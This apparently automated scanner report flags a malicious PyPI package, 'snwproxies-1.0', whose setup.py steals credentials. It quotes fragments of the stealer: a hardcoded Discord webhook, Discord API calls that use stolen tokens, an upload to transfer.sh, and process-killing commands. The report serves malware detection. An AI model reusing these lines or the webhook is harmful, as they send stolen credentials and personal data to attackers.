{
  "package_name": "snwproxies-1.0",
  "total_matches": 11,
  "is_malicious": true,
  "file_results": [
    {
      "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/snwproxies-1.0/snwproxies-1.0/setup.py",
      "file_name": "setup.py",
      "detection_count": 11,
      "is_malicious": true,
      "confidence": "high",
      "malicious_behavior": "This code is a credential and information stealer, exhibiting multiple critical indicators of malicious behavior. It collects sensitive data from the victim's system, including browser passwords, cookies, Discord tokens, billing information, and files from common user directories (Desktop, Downloads, Documents). It decrypts browser-stored credentials using Windows APIs, searches for cryptocurrency wallet data, and exfiltrates all collected information to hardcoded Discord webhooks and external file-sharing services (e.g., transfer.sh). The code uses threading for parallel data theft, suppresses exceptions to evade detection, and attempts to install dependencies at runtime to ensure its functionality. It also kills processes (e.g., browsers, wallets) to access locked files, and uploads stolen data in bulk. The presence of hardcoded C2 endpoints, automated data exfiltration, credential decryption, and execution during package installation (via setup.py) are all hallmarks of modern Python malware, especially those distributed via supply chain attacks or malicious PyPI packages.",
      "false_positive_reason": "",
      "detection_points": [
        {
          "line_number": "4",
          "type_description": "code-execution: found 3 source code matches",
          "code_snippet": "exec('')",
          "full_match": "* This package is executing OS commands in the setup.py file at snwproxies-1.0/setup.py:4",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/snwproxies-1.0/snwproxies-1.0/setup.py",
          "relative_path": "snwproxies-1.0/setup.py"
        },
        {
          "line_number": "37",
          "type_description": "code-execution: found 3 source code matches",
          "code_snippet": "subprocess.Popen(f\"{executable} -m pip install {modl[1]}\",shell=True)",
          "full_match": "* This package is executing OS commands in the setup.py file at snwproxies-1.0/setup.py:37",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/snwproxies-1.0/snwproxies-1.0/setup.py",
          "relative_path": "snwproxies-1.0/setup.py"
        },
        {
          "line_number": "524",
          "type_description": "code-execution: found 3 source code matches",
          "code_snippet": "subprocess.Popen(f\"taskkill /im {procc} /t /f\",shell=True)",
          "full_match": "* This package is executing OS commands in the setup.py file at snwproxies-1.0/setup.py:524",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/snwproxies-1.0/snwproxies-1.0/setup.py",
          "relative_path": "snwproxies-1.0/setup.py"
        },
        {
          "line_number": "21",
          "type_description": "shady-links: found 8 source code matches",
          "code_snippet": "hook='https://discord.com/api/webhooks/1075015307749511168/zW0wmO7PoeePt7LvQtnGFt44j1dG2YmJwnzkhKsO5HeRUoQ_2ImSLyoLJP3TlKqGILWA'",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at snwproxies-1.0/setup.py:21",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/snwproxies-1.0/snwproxies-1.0/setup.py",
          "relative_path": "snwproxies-1.0/setup.py"
        },
        {
          "line_number": "26",
          "type_description": "shady-links: found 8 source code matches",
          "code_snippet": "ip=urlopen(Request('https://api.ipify.org')).read().decode().strip()",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at snwproxies-1.0/setup.py:26",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/snwproxies-1.0/snwproxies-1.0/setup.py",
          "relative_path": "snwproxies-1.0/setup.py"
        },
        {
          "line_number": "129",
          "type_description": "shady-links: found 8 source code matches",
          "code_snippet": "friendlist=loads(urlopen(Request('https://discord.com/api/v6/users/@me/relationships',headers=headers)).read().decode())",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at snwproxies-1.0/setup.py:129",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/snwproxies-1.0/snwproxies-1.0/setup.py",
          "relative_path": "snwproxies-1.0/setup.py"
        },
        {
          "line_number": "151",
          "type_description": "shady-links: found 8 source code matches",
          "code_snippet": "billingjson=loads(urlopen(Request('https://discord.com/api/users/@me/billing/payment-sources',headers=headers)).read().decode())",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at snwproxies-1.0/setup.py:151",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/snwproxies-1.0/snwproxies-1.0/setup.py",
          "relative_path": "snwproxies-1.0/setup.py"
        },
        {
          "line_number": "206",
          "type_description": "shady-links: found 8 source code matches",
          "code_snippet": "request_guilds=urlopen(Request('https://discord.com/api/v9/users/@me/guilds?with_counts=true',headers=headers)).read().decode()",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at snwproxies-1.0/setup.py:206",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/snwproxies-1.0/snwproxies-1.0/setup.py",
          "relative_path": "snwproxies-1.0/setup.py"
        },
        {
          "line_number": "214",
          "type_description": "shady-links: found 8 source code matches",
          "code_snippet": "request_billing_history=urlopen(Request('https://discord.com/api/v9/users/@me/billing/payments?limit=20',headers=headers)).read().decode()",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at snwproxies-1.0/setup.py:214",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/snwproxies-1.0/snwproxies-1.0/setup.py",
          "relative_path": "snwproxies-1.0/setup.py"
        },
        {
          "line_number": "601",
          "type_description": "shady-links: found 8 source code matches",
          "code_snippet": "upload=requests.post('https://transfer.sh/',files=files)",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at snwproxies-1.0/setup.py:601",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/snwproxies-1.0/snwproxies-1.0/setup.py",
          "relative_path": "snwproxies-1.0/setup.py"
        },
        {
          "line_number": "683",
          "type_description": "shady-links: found 8 source code matches",
          "code_snippet": "'mail','[coinbase](https://coinbase.com)','[sellix](https://sellix.io)','[gmail](https://gmail.com)','[steam](https://steam.com)','[discord](https://discord.com)','[riotgames](https://riotgames.com)','[youtube](https://youtube.com)','[i...lix.com)'",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at snwproxies-1.0/setup.py:683",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/snwproxies-1.0/snwproxies-1.0/setup.py",
          "relative_path": "snwproxies-1.0/setup.py"
        }
      ]
    }
  ]
}